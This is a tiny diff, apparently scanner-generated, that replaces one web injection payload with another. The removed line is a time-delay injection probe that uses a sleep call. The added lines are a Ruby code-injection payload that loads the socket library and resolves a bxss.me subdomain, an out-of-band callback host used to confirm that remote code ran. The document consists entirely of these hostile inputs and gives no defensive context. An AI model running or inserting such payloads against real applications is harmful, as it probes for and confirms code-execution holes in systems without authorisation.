@@ -1,1 +1,2 @@
-555'||sleep(27*1000)*ccbmsq||'
+'A'.concat(70-3).concat(22*4).concat(116).concat(74).concat(121).concat(74)+(require'socket'
+Socket.gethostbyname('hitnu'+'twzwnntv5dab1.bxss.me.')[3].to_s)
